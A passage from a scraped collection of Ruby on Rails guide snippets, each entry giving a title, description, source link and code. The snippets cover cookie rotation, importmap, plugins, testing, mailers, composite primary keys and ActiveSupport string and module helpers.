Rails.application.config.action_dispatch.signed_cookie_salt\n\n    secret_key_base = Rails.application.secret_key_base\n\n    key_generator = ActiveSupport::KeyGenerator.new(\n      secret_key_base, iterations: 1000, hash_digest_class: OpenSSL::Digest::SHA1\n    )\n    key_len = ActiveSupport::MessageEncryptor.key_len\n\n    old_encrypted_secret = key_generator.generate_key(authenticated_encrypted_cookie_salt, key_len)\n    old_signed_secret = key_generator.generate_key(signed_cookie_salt)\n\n    cookies.rotate :encrypted, old_encrypted_secret\n    cookies.rotate :signed, old_signed_secret\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Adding npm Packages with importmap-rails in Bash\nDESCRIPTION: Command to add new npm packages to an import map-powered Rails application using the importmap pin command.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/working_with_javascript_in_rails.md#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/importmap pin react react-dom\n```\n\n----------------------------------------\n\nTITLE: Adding acts_as_yaffle Class Method Skeleton - Ruby Module - Ruby\nDESCRIPTION: Provides a structural definition for the acts_as_yaffle method as a class method using ActiveSupport::Concern. Prepares for future logic to be added to handle configuration and instance/class methods. Requires ActiveSupport and expected to be included in ApplicationRecord or subclasses.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/plugins.md#2025-04-23_snippet_18\n\nLANGUAGE: ruby\nCODE:\n```\n# yaffle/lib/yaffle/acts_as_yaffle.rb\n\nmodule Yaffle\n  module ActsAsYaffle\n    extend ActiveSupport::Concern\n\n    class_methods do\n      def acts_as_yaffle(options = {})\n      end\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Running System Tests (Bash)\nDESCRIPTION: This command demonstrates how to run system tests specifically using the Rails testing framework. It is important to run system tests separately from other tests to ensure the browser and related setup are correctly handled.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_69\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails test:system\n```\n\n----------------------------------------\n\nTITLE: Describing Legacy Table Schema - PostgreSQL Table Description - SQL\nDESCRIPTION: Provides a \\\\d output of a legacy PostgreSQL table named TBL_ART, detailing columns, types, defaults, and indexes. Serves as context for following view-wrapping examples, showing non-Rails conventions such as uppercase identifiers and unconventional names. No direct code to execute; for documentation/reference use.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_postgresql.md#2025-04-23_snippet_19\n\nLANGUAGE: sql\nCODE:\n```\nrails_pg_guide=# \\\\d \\\"TBL_ART\\\"\\n                                        Table \\\"public.TBL_ART\\\"\\n   Column   |            Type             |                         Modifiers\\n------------+-----------------------------+------------------------------------------------------------\\n INT_ID     | integer                     | not null default nextval('\\\"TBL_ART_INT_ID_seq\\\"'::regclass)\\n STR_TITLE  | character varying           |\\n STR_STAT   | character varying           | default 'draft'::character varying\\n DT_PUBL_AT | timestamp without time zone |\\n BL_ARCH    | boolean                     | default false\\nIndexes:\\n    \\\"TBL_ART_pkey\\\" PRIMARY KEY, btree (\\\"INT_ID\\\")\n```\n\n----------------------------------------\n\nTITLE: Nested Forms in the View with fields_for in Rails\nDESCRIPTION: This ERB snippet demonstrates how to create a nested form using `form_with` and `fields_for` to allow a user to create a `Person` and its associated `Address` records within the same form. The `fields_for` helper iterates through the addresses association of the `@person` object, rendering input fields for the `kind` and `street` attributes of each address.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_77\n\nLANGUAGE: html+erb\nCODE:\n```\n<%= form_with model: @person do |form| %>\n  Addresses:\n  <ul>\n    <%= form.fields_for :addresses do |addresses_form| %>\n      <li>\n        <%= addresses_form.label :kind %>\n        <%= addresses_form.text_field :kind %>\n\n        <%= addresses_form.label :street %>\n        <%= addresses_form.text_field :street %>\n        ...\n      </li>\n    <% end %>\n  </ul>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Installing Bundler - Bash\nDESCRIPTION: Command for installing the latest version of Bundler Ruby gem, a prerequisite for generating guides locally. Requires rubygems and local Ruby installation. Input is a shell command; output is updated gem state.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/ruby_on_rails_guides_guidelines.md#2025-04-23_snippet_10\n\nLANGUAGE: bash\nCODE:\n```\n$ gem install bundler\n```\n\n----------------------------------------\n\nTITLE: Invoking Action Mailer with deliver_now in Rails 4.2\nDESCRIPTION: Example showing how to invoke a mailer in Rails 4.2, where the mailer method is not executed until deliver_now is called explicitly.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_71\n\nLANGUAGE: ruby\nCODE:\n```\nmail = Notifier.notify(user) # Notifier#notify is not yet called at this point\nmail = mail.deliver_now           # Prints \"Called\"\n```\n\n----------------------------------------\n\nTITLE: Testing Parameterized Mailer Enqueueing (Ruby)\nDESCRIPTION: This test asserts that a parameterized mailer has been enqueued with the correct parameters and arguments, passed as `params` and `args` options respectively to `assert_enqueued_email_with`. It uses `UserMailer.with` to set parameters and then calls `create_invite` to create the email.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_98\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"test_helper\"\n\nclass UserMailerTest < ActionMailer::TestCase\n  test \"invite\" do\n    # Create the email and store it for further assertions\n    email = UserMailer.with(all: \"good\").create_invite(\"me@example.com\", \"friend@example.com\")\n\n    # Test that the email got enqueued with the correct mailer parameters and arguments\n    assert_enqueued_email_with UserMailer, :create_invite,\n    params: { all: \"good\" }, args: [\"me@example.com\", \"friend@example.com\"] do\n      email.deliver_later\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Declaring acts_as_yaffle for Hickwall Model - ActiveRecord Model Extension - Ruby\nDESCRIPTION: Reopens the Hickwall model to call acts_as_yaffle, enabling the plugin's functionality on that model. Makes use of public class methods contributed via Yaffle::ActsAsYaffle. Only dependency is the inclusion of the plugin within the Rails app.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/plugins.md#2025-04-23_snippet_16\n\nLANGUAGE: ruby\nCODE:\n```\n# test/dummy/app/models/hickwall.rb\n\nclass Hickwall < ApplicationRecord\n  acts_as_yaffle\nend\n```\n\n----------------------------------------\n\nTITLE: Creating Edge Rails Applications\nDESCRIPTION: Commands for creating Rails applications using edge versions directly from the Git repository or local development copies.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_0_release_notes.md#2025-04-23_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\n$ rails new myapp --edge\n$ ruby /path/to/rails/bin/rails new myapp --dev\n```\n\n----------------------------------------\n\nTITLE: Configuring Associations with Composite Foreign Keys\nDESCRIPTION: Example of setting up associations with composite foreign keys using the query_constraints option in ActiveRecord, allowing for proper relationship handling with multiple key columns.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_1_release_notes.md#2025-04-23_snippet_7\n\nLANGUAGE: ruby\nCODE:\n```\nclass TravelRouteReview < ActiveRecord::Base\n  belongs_to :travel_route, query_constraints: [:travel_route_origin, :travel_route_destination]\nend\n```\n\n----------------------------------------\n\nTITLE: Creating Associated Records with Composite Primary Key\nDESCRIPTION: This snippet creates an `Order` record with a composite primary key and then creates a `Book` record associated with that order. This demonstrates how to create associated records when one of the models has a composite primary key. The generated SQL will only use the `:id` from the composite primary key when accessing the `Order`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_composite_primary_keys.md#_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\norder = Order.create!(id: [1, 2], status: \"pending\")\nbook = order.books.create!(title: \"A Cool Book\")\n```\n\n----------------------------------------\n\nTITLE: Simplifying String Pattern Removal - Ruby\nDESCRIPTION: Introduces `String#remove(pattern)`, a shortcut for removing substrings or patterns from a string, equivalent to `gsub(pattern, '')`. Requires ActiveSupport's string core extensions. Input is a pattern or substring to remove; output is the string with all matches removed.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_1_release_notes.md#2025-04-23_snippet_15\n\nLANGUAGE: Ruby\nCODE:\n```\n\"account123\".remove(/\\d+/) # => \"account\"\n```\n\n----------------------------------------\n\nTITLE: SQL for Accessing Associated Author using Composite Key\nDESCRIPTION: This snippet demonstrates the SQL query generated when accessing an associated `Author` record from a `Book` record, when a composite foreign key is explicitly specified in the association. The `WHERE` clause includes both `first_name` and `last_name` from the composite key.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_composite_primary_keys.md#_snippet_12\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM authors WHERE first_name = 'Jane' AND last_name = 'Doe'\n```\n\n----------------------------------------\n\nTITLE: Using instance-level respond_to in a Ruby on Rails controller\nDESCRIPTION: This snippet shows how to use the instance-level respond_to method in a Rails controller, which is unaffected by the changes in Rails 4.2.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_2_release_notes.md#2025-04-23_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\n# app/controllers/users_controller.rb\n\nclass UsersController < ApplicationController\n  def show\n    @user = User.find(params[:id])\n    respond_to do |format|\n      format.html\n      format.json { render json: @user }\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Named Scope Chain Behavior Change\nDESCRIPTION: Shows how named scope chains no longer leak scope to class-level querying methods, changing how WHERE clauses are combined.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/6_1_release_notes.md#2025-04-23_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ActiveRecord::Base\n  scope :david, -> { User.where(name: \"David\") }\nend\n```\n\nLANGUAGE: ruby\nCODE:\n```\nUser.where(name: \"John\").david\n# SELECT * FROM users WHERE name = 'John' AND name = 'David'\n```\n\nLANGUAGE: ruby\nCODE:\n```\nUser.where(name: \"John\").david\n# SELECT * FROM users WHERE name = 'David'\n```\n\n----------------------------------------\n\nTITLE: Rails Current Transaction Test Ruby\nDESCRIPTION: Illustrates how to use ActiveRecord::Base.current_transaction within a Rails test.  The example verifies that the current_transaction method functions as expected despite the implicit transaction around tests.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_33\n\nLANGUAGE: ruby\nCODE:\n```\nclass MyTest < ActiveSupport::TestCase\n  test \"Active Record current_transaction method works as expected\" do\n    # The implicit transaction around tests does not interfere with the\n    # application-level semantics of the current_transaction.\n    assert User.current_transaction.blank?\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Incorrect ERB Usage Example (HTML+ERB)\nDESCRIPTION: This code snippet shows an example of incorrect usage of `puts` within an ERB template. The `puts` function's output will not be rendered to the view, demonstrating a common mistake when working with ERB.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_2\n\nLANGUAGE: HTML+ERB\nCODE:\n```\n<%# WRONG %>\nHi, Mr. <% puts \"Frodo\" %>\n```\n\n----------------------------------------\n\nTITLE: Autocorrecting Code with RuboCop\nDESCRIPTION: This command-line instruction runs RuboCop with the `--autocorrect` flag to automatically fix code style offenses in the codebase.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_129\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rubocop -a\n```\n\n----------------------------------------\n\nTITLE: Registering DebugExceptions Interceptor in Ruby on Rails\nDESCRIPTION: Introduces ActionDispatch::DebugExceptions.register_interceptor method to hook into DebugExceptions and process exceptions before rendering.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/6_0_release_notes.md#2025-04-23_snippet_0\n\nLANGUAGE: Ruby\nCODE:\n```\nActionDispatch::DebugExceptions.register_interceptor\n```\n\n----------------------------------------\n\nTITLE: Updating Engine Configuration in Rails 3.2\nDESCRIPTION: Code for the script/rails file in Rails 3.2 engines, defining the engine root and path before requiring Rails dependencies.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_2_release_notes.md#2025-04-23_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\nENGINE_ROOT = File.expand_path('../..', __FILE__)\nENGINE_PATH = File.expand_path('../../lib/your_engine_name/engine', __FILE__)\n\nrequire \"rails/all\"\nrequire \"rails/engine/commands\"\n```\n\n----------------------------------------\n\nTITLE: Inspecting Module Parent Name with module_parent_name Ruby\nDESCRIPTION: This snippet illustrates how to use `module_parent_name` to get the fully qualified name of the parent module.  For a top-level or anonymous module, it returns `nil`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_17\n\nLANGUAGE: ruby\nCODE:\n```\nmodule X\n  module Y\n    module Z\n    end\n  end\nend\nM = X::Y::Z\n\nX::Y::Z.module_parent_name # => \"X::Y\"\nM.module_parent_name       # => \"X::Y\"\n```\n\n----------------------------------------\n\nTITLE: Prepending Custom View Paths in Action Mailer (Ruby)\nDESCRIPTION: This snippet illustrates how to prepend a custom view path for a Rails mailer by calling prepend_view_path in the UserMailer class. This changes the directory from where templates are resolved, making it possible to use templates outside the standard app/views/mailer_name directory. Requirements include a custom template at the specified path.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_15\n\nLANGUAGE: ruby\nCODE:\n```\nclass UserMailer < ApplicationMailer\n  prepend_view_path \"custom/path/to/mailer/view\"\n\n  # This will try to load \"custom/path/to/mailer/view/welcome_email\" template\n  def welcome_email\n    # ...\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: New Rails Command Line Features\nDESCRIPTION: New command line features added to Rails including test runner, restart functionality, initializers listing, dev cache toggling, and environment update script.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/5_0_release_notes.md#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nbin/rails test\nbin/rails restart\nbin/rails initializers\nbin/rails dev:cache\nbin/update\n```\n\n----------------------------------------\n\nTITLE: Truncate Words with Separator\nDESCRIPTION: This snippet truncates a string after a specified number of words, using a separator to find the break point.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_50\n\nLANGUAGE: ruby\nCODE:\n```\n\"Oh dear! Oh dear! I shall be late!\".truncate_words(3, separator: \"!\")\n# => \"Oh dear! Oh dear! I shall be late...\"\n```\n\n----------------------------------------\n\nTITLE: Creating Edge Rails Application\nDESCRIPTION: Command for creating a new Rails application using the latest edge version directly from the Git repository.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_2_release_notes.md#2025-04-23_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\n$ rails new myapp --edge\n```\n\n----------------------------------------\n\nTITLE: Deferred execution of Action Mailer methods in Rails 4.2\nDESCRIPTION: Example showing how mailer method execution is deferred until deliver_now or deliver_later is called in Rails 4.2, demonstrating the change in behavior from previous versions.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_70\n\nLANGUAGE: ruby\nCODE:\n```\nclass Notifier < ActionMailer::Base\n  def notify(user)\n    puts \"Called\"\n    mail(to: user.email)\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: HTTP Digest Authentication Implementation\nDESCRIPTION: Shows how to implement HTTP digest authentication using authenticate_or_request_with_http_digest in a Rails controller.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_3_release_notes.md#2025-04-23_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\nclass PostsController < ApplicationController\n  Users = {\"dhh\" => \"secret\"}\n  before_filter :authenticate\n\n  def secret\n    render :text => \"Password Required!\"\n  end\n\n  private\n  def authenticate\n    realm = \"Application\"\n    authenticate_or_request_with_http_digest(realm) do |name|\n      Users[name]\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring JSON Time Precision\nDESCRIPTION: Configuration for JSON time precision settings in Rails 4.1\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_78\n\nLANGUAGE: ruby\nCODE:\n```\nActiveSupport::JSON::Encoding.time_precision = 0\n```\n\n----------------------------------------\n\nTITLE: Configuring PostgreSQL Authentication\nDESCRIPTION: Commands to set up PostgreSQL authentication for both Linux/BSD and macOS systems by creating a superuser for development.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/development_dependencies_install.md#2025-04-23_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\n$ sudo -u postgres createuser --superuser $USER\n```\n\nLANGUAGE: bash\nCODE:\n```\n$ createuser --superuser $USER\n```\n\n----------------------------------------\n\nTITLE: Template File Content\nDESCRIPTION: Basic content for the initializer template file\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/generators.md#2025-04-23_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\n# Add initialization content here\n```\n\n----------------------------------------\n\nTITLE: Example of Bad vs. Good Documentation Wording - Capitalization and Punctuation\nDESCRIPTION: Demonstrates proper capitalization and punctuation in comments, showing that documentation should follow standard grammar rules with proper capitalization and punctuation.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_documentation_guidelines.md#2025-04-23_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\n# BAD\n# declares an attribute reader backed by an internally-named\n# instance variable\n\n# GOOD\n# Declares an attribute reader backed by an internally-named\n# instance variable.\n```\n\n----------------------------------------\n\nTITLE: Active Storage Attachments Fixture - YAML\nDESCRIPTION: This YAML fixture defines an Active Storage attachment fixture named `first_thumbnail_attachment` for the `thumbnail` of the `first` Article, linking to `first_thumbnail_blob`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_30\n\nLANGUAGE: yaml\nCODE:\n```\n# test/fixtures/active_storage/attachments.yml\nfirst_thumbnail_attachment:\n  name: thumbnail\n  record: first (Article)\n  blob: first_thumbnail_blob\n```\n\n----------------------------------------\n\nTITLE: Installing Dependencies on FreeBSD\nDESCRIPTION: Commands to install all required dependencies on FreeBSD systems using pkg and ports.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/development_dependencies_install.md#2025-04-23_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\n$ sudo pkg install sqlite3 mysql80-client mysql80-server postgresql11-client postgresql11-server memcached imagemagick6 ffmpeg mupdf yarn libxml2 vips poppler-utils\n# portmaster databases/redis\n```\n\n----------------------------------------\n\nTITLE: Implementing Nested Attributes with accepts_nested_attributes_for in Ruby on Rails\nDESCRIPTION: Demonstrates how to enable a model to accept nested attributes for associated models using the accepts_nested_attributes_for method, which enables automatic saving of a record with its associated children.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_3_release_notes.md#2025-04-23_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\nclass Book < ActiveRecord::Base\n  has_one :author\n  has_many :pages\n\n  accepts_nested_attributes_for :author, :pages\nend\n```\n\n----------------------------------------\n\nTITLE: Defining Product Fixture - YAML\nDESCRIPTION: This YAML snippet defines a product fixture named `tshirt`. It sets the `name` to \"T-Shirt\" and the `inventory_count` to 15.  Fixtures are used for predefined data that is automatically loaded into the test database, enabling reliable and consistent testing.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_122\n\nLANGUAGE: yaml\nCODE:\n```\ntshirt:\n  name: T-Shirt\n  inventory_count: 15\n```\n\n----------------------------------------\n\nTITLE: Truncate Words\nDESCRIPTION: This snippet truncates a string after a specified number of words, adding an ellipsis at the end.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_48\n\nLANGUAGE: ruby\nCODE:\n```\n\"Oh dear! Oh dear! I shall be late!\".truncate_words(4)\n# => \"Oh dear! Oh dear!...\"\n```\n\n----------------------------------------\n\nTITLE: Creating a Rails 4.0 Application Using Local Repository\nDESCRIPTION: Command to generate a new Rails application using a local checkout of the Rails repository with the --dev flag.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/4_0_release_notes.md#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n$ ruby /path/to/rails/railties/bin/rails new myapp --dev\n```\n\n----------------------------------------\n\nTITLE: Running Brakeman for Security Analysis\nDESCRIPTION: This command executes Brakeman, a security vulnerability scanner for Rails applications. The output provides a report of any potential security warnings found in the application.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_130\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/brakeman\n```\n\n----------------------------------------\n\nTITLE: Formatting Numbers as Human-Readable Size in Ruby\nDESCRIPTION: Shows how to format numbers as human-readable file sizes using `to_fs(:human_size)`. This is an ActiveSupport core extension to the Numeric class.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_103\n\nLANGUAGE: ruby\nCODE:\n```\n123.to_fs(:human_size)                  # => 123 Bytes\n1234.to_fs(:human_size)                 # => 1.21 KB\n12345.to_fs(:human_size)                # => 12.1 KB\n1234567.to_fs(:human_size)              # => 1.18 MB\n1234567890.to_fs(:human_size)           # => 1.15 GB\n1234567890123.to_fs(:human_size)        # => 1.12 TB\n1234567890123456.to_fs(:human_size)     # => 1.1 PB\n1234567890123456789.to_fs(:human_size)  # => 1.07 EB\n```\n\n----------------------------------------\n\nTITLE: Using ImportMap CLI Command\nDESCRIPTION: Command-line interface reference for managing JavaScript dependencies in Rails applications using importmap-rails.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/asset_pipeline.md#2025-04-23_snippet_27\n\nLANGUAGE: shell\nCODE:\n```\nbin/importmap\n```\n\n----------------------------------------\n\nTITLE: Applying a Rails Template to an Existing Application using Rake\nDESCRIPTION: This command demonstrates how to apply a Rails application template to an existing Rails application using a rake task. The template file contains instructions for adding plugins, gems, or other code modifications that will be layered on top of the existing application code.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_3_release_notes.md#2025-04-23_snippet_23\n\nLANGUAGE: bash\nCODE:\n```\n$ rake rails:template LOCATION=~/template.rb\n```\n\n----------------------------------------\n\nTITLE: Using Dynamic Scopes in Active Record for Method Chaining\nDESCRIPTION: Shows examples of using dynamic scope methods in Active Record, which allow filtering on the fly and method chaining without explicit scope definitions.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_3_release_notes.md#2025-04-23_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nOrder.scoped_by_customer_id(12)\nOrder.scoped_by_customer_id(12).find(:all,\n  :conditions => \"status = 'open'\")\nOrder.scoped_by_customer_id(12).scoped_by_status(\"open\")\n```\n\n----------------------------------------\n\nTITLE: Rails Test Runner Help - Bash\nDESCRIPTION: This command shows the usage instructions and available options for the Rails test runner.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_22\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails test -h\nUsage:\n  bin/rails test [PATHS...]\n\nRun tests except system tests\n\nExamples:\n    You can run a single test by appending a line number to a filename:\n\n        bin/rails test test/models/user_test.rb:27\n\n    You can run multiple tests with in a line range by appending the line range to a filename:\n\n        bin/rails test test/models/user_test.rb:10-20\n\n    You can run multiple files and directories at the same time:\n\n        bin/rails test test/controllers test/integration/login_test.rb\n\n    By default test failures and errors are reported inline during a run.\n\nminitest options:\n    -h, --help                       Display this help.\n        --no-plugins                 Bypass minitest plugin auto-loading (or set $MT_NO_PLUGINS).\n    -s, --seed SEED                  Sets random seed. Also via env. Eg: SEED=n rake\n    -v, --verbose                    Verbose. Show progress processing files.\n        --show-skips                 Show skipped at the end of run.\n    -n, --name PATTERN               Filter run on /regexp/ or string.\n        --exclude PATTERN            Exclude /regexp/ or string from run.\n    -S, --skip CODES                 Skip reporting of certain types of results (eg E).\n\nKnown extensions: rails, pride\n    -w, --warnings                   Run with Ruby warnings enabled\n    -e, --environment ENV            Run tests in the ENV environment\n    -b, --backtrace                  Show the complete backtrace\n    -d, --defer-output               Output test failures and errors after the test run\n    -f, --fail-fast                  Abort test run on first failure or error\n    -c, --[no-]color                 Enable color in the output\n        --profile [COUNT]            Enable profiling of tests and list the slowest test cases (default: 10)\n    -p, --pride                      Pride. Show your testing pride!\n```\n\n----------------------------------------\n\nTITLE: Creating Namespaced Forms in Rails (ERB)\nDESCRIPTION: Shows how to create a form with a namespace to ensure uniqueness of id attributes on form elements in Rails views.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_2_release_notes.md#2025-04-23_snippet_11\n\nLANGUAGE: erb\nCODE:\n```\n<%= form_for(@offer, :namespace => 'namespace') do |f| %>\n  <%= f.label :version, 'Version' %>:\n  <%= f.text_field :version %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: Documenting Option Descriptions in Ruby - Ruby\nDESCRIPTION: Provides a standard docstring line for documenting a validation or configuration option in a Ruby method. The example uses <tt>:allow_nil</tt> for fixed-width styling and describes the effect of the option. Intended for use in model or method documentation to inform consumers about the purpose and effect of options. No external code except for documentation tooling is required.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_documentation_guidelines.md#2025-04-23_snippet_23\n\nLANGUAGE: ruby\nCODE:\n```\n# * <tt>:allow_nil</tt> - Skip validation if attribute is +nil+.\n```\n\n----------------------------------------\n\nTITLE: Example Cache Delete Payload in ActiveSupport\nDESCRIPTION: Example of a payload structure for cache_delete.active_support event indicating the key being deleted and the cache store class being used.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_26\n\nLANGUAGE: ruby\nCODE:\n```\n{\n  key: \"name-of-complicated-computation\",\n  store: \"ActiveSupport::Cache::MemCacheStore\"\n}\n```\n\n----------------------------------------\n\nTITLE: Rendering HTML\nDESCRIPTION: Renders a string containing HTML markup. Uses the `helpers.tag.strong` method to create a strong tag.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\nrender html: helpers.tag.strong(\"Not Found\")\n```\n\n----------------------------------------\n\nTITLE: Handling Command Aliases and Invocation in rails/commands.rb (Ruby)\nDESCRIPTION: This script (`rails/commands.rb`) processes command-line arguments received after `bin/rails`. It defines a hash (`aliases`) mapping common shortcuts (e.g., 's') to their full command names (e.g., 'server'). It takes the first argument, resolves it using the aliases if applicable, and then uses `Rails::Command.invoke` to execute the corresponding command logic, passing along any remaining arguments.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/initialization.md#2025-04-23_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"rails/command\"\n\naliases = {\n  \"g\"  => \"generate\",\n  \"d\"  => \"destroy\",\n  \"c\"  => \"console\",\n  \"s\"  => \"server\",\n  \"db\" => \"dbconsole\",\n  \"r\"  => \"runner\",\n  \"t\"  => \"test\"\n}\n\ncommand = ARGV.shift\ncommand = aliases[command] || command\n\nRails::Command.invoke command, ARGV\n```\n\n----------------------------------------\n\nTITLE: Namespaced Engine Routes\nDESCRIPTION: Route configuration with namespace isolation for a mountable engine\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\nBlorgh::Engine.routes.draw do\nend\n```\n\n----------------------------------------\n\nTITLE: Console output creating new product\nDESCRIPTION: This code block is not code, but terminal output describing creating and saving a new product using Product.new() and product.save().\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_20\n\nLANGUAGE: irb\nCODE:\n```\nstore(dev)> product = Product.new(name: \"T-Shirt\")\n=> #<Product:0x000000012e616c30 id: nil, name: \"T-Shirt\", created_at: nil, updated_at: nil>\nstore(dev)> product.save\n  TRANSACTION (0.1ms)  BEGIN immediate TRANSACTION /*application='Store'*/\n  Product Create (0.9ms)  INSERT INTO \"products\" (\"name\", \"created_at\", \"updated_at\") VALUES ('T-Shirt', '2024-11-09 16:35:01.117836', '2024-11-09 16:35:01.117836') RETURNING \"id\" /*application='Store'*/\n  TRANSACTION (0.9ms)  COMMIT TRANSACTION /*application='Store'*/\n=> true\nstore(dev)> product\n=> #<Product:0x00000001221f6260 id: 1, name: \"T-Shirt\", created_at: \"2024-11-09 16:35:01.117836000 +0000\", updated_at: \"2024-11-09 16:35:01.117836000 +0000\">\n```\n\n----------------------------------------\n\nTITLE: Customizing Error Field Wrapper in Ruby on Rails\nDESCRIPTION: This snippet demonstrates how to customize the field_error_proc configuration option in Rails to change how error fields are wrapped in HTML.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_validations.md#2025-04-23_snippet_77\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.action_view.field_error_proc = Proc.new { |html_tag, instance| content_tag :div, html_tag, class: \"field_with_errors\" }\n```\n\n----------------------------------------\n\nTITLE: Writing Headings with Markdown Conventions - Markdown\nDESCRIPTION: Demonstrates proper structure for headings in Ruby on Rails documentation using Markdown, including section and subsection hierarchy. No special dependencies required; this serves as a pattern for organizing guide content. Typical inputs are guide titles and section names, with output conforming to expected HTML heading structures.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/ruby_on_rails_guides_guidelines.md#2025-04-23_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\nGuide Title\n===========\n\nSection\n-------\n\n### Sub Section\n```\n\n----------------------------------------\n\nTITLE: Retrieving Module Parents with module_parents Ruby\nDESCRIPTION: This code demonstrates how to use `module_parents` to obtain an array containing the module and all its parent modules up to `Object`. The array is ordered from the bottom (the module itself) to the top (`Object`).\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_18\n\nLANGUAGE: ruby\nCODE:\n```\nmodule X\n  module Y\n    module Z\n    end\n  end\nend\nM = X::Y::Z\n\nX::Y::Z.module_parents # => [X::Y, X, Object]\nM.module_parents       # => [X::Y, X, Object]\n```\n\n----------------------------------------\n\nTITLE: Passing Test Output (Bash)\nDESCRIPTION: This displays the output when a test passes successfully. The green dot (`.`) indicates a successful test run. The output also shows the number of runs, assertions, failures, errors, and skips.\nSOURCE: 